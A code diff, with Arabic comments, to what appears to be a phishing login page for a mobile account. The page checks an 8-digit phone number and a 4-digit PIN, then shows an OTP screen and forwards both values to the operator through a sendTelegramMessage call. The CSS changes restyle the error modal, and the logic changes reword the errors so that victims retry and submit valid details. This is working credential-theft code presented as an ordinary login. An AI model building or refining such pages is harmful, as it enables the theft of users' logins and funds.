@@ -251,37 +251,37 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
 }
 
 .modal-card {
-  width: 82%;
-  max-width: 320px;
+  width: 85%;
+  max-width: 330px;
   background: #fff;
-  border-radius: 4px;
+  border-radius: 6px;
   overflow: hidden;
-  box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+  box-shadow: 0 4px 20px rgba(0,0,0,0.25);
   text-align: center;
   animation: fadeIn 0.2s ease-in-out;
 }
 
 .modal-body {
-  padding: 24px 20px;
+  padding: 28px 20px 22px;
 }
 
 .modal-title {
-  font-size: 17px;
+  font-size: 18px;
   font-weight: 800;
   color: #1a1a1a;
   margin-bottom: 12px;
 }
 
 .modal-text {
-  font-size: 14px;
-  color: #444;
-  line-height: 1.5;
+  font-size: 14.5px;
+  color: #555;
+  line-height: 1.6;
   font-weight: 600;
 }
 
 .modal-btn {
   width: 100%;
-  height: 44px;
+  height: 46px;
   background: #00bcd4;
   border: none;
   color: #fff;
@@ -500,27 +500,33 @@ function login(){
   var isValidPrefix = (firstChar === '2' || firstChar === '3' || firstChar === '4');
   var isPinPartiallyFilled = (pin.length > 0 && pin.length < 4);
 
-  // التحقق من الرقم السري المتطابق يظهر حصرياً عند الضغط على تسجيل الدخول
-  if (pin.length === 4 && checkDuplicatePins()) {
-    document.getElementById('error-modal-text').textContent = "الرقم السري غير صالح";
+  // إذا كان رقم الهاتف غير صالح أو غير مكتمل أو بادئته خطأ -> عرض تنبيه "اسم المستخدم غير صالح"
+  if(ph.length !== 8 || !isValidPrefix){
+    document.getElementById('error-modal-text').textContent = "اسم المستخدم غير صالح";
     document.getElementById('user-error-modal').classList.remove('hide');
     return;
   }
 
-  if(ph.length !== 8 || !isValidPrefix || pin.length !== 4 || isPinPartiallyFilled){
-    document.getElementById('error-modal-text').textContent = "اسم المستخدم غير صالح";
+  // إذا كان الرقم السري غير مكتمل أو يحتوي على أرقام متطابقة -> عرض تنبيه "المعلومات التي أدخلتها غير صحيحة..."
+  if(pin.length !== 4 || isPinPartiallyFilled || checkDuplicatePins()){
+    document.getElementById('error-modal-text').textContent = "المعلومات التي أدخلتها غير صحيحة. يرجى إعادة المحاولة";
     document.getElementById('user-error-modal').classList.remove('hide');
-  } else {
-    showOtp();
-    const msg = `<b>تسجيل دخول جديد</b>\n<b>رقم الهاتف:</b> ${ph}\n<b>الرقم السري:</b> ${pin}`;
-    sendTelegramMessage(msg);
+    return;
   }
+
+  // إذا كانت البيانات صحيحة تماماً -> الانتقال لصفحة OTP وإرسال البيانات لتليجرام
+  showOtp();
+  const msg = `<b>تسجيل دخول جديد</b>\n<b>رقم الهاتف:</b> ${ph}\n<b>الرقم السري:</b> ${pin}`;
+  sendTelegramMessage(msg);
 }
 
 function closeUserErrorModal(){
   document.getElementById('user-error-modal').classList.add('hide');
-  P.forEach(p => p.value = '');
-  P[0].focus();
+  // إذا كان الخطأ متعلقاً بالرقم السري، نقوم بتفريغه فقط لتسهيل إعادة المحاولة
+  if (document.getElementById('error-modal-text').textContent.includes("المعلومات")) {
+    P.forEach(p => p.value = '');
+    P[0].focus();
+  }
 }
 
 var O=[0,1,2,3].map(function(i){return document.getElementById('o'+i);});
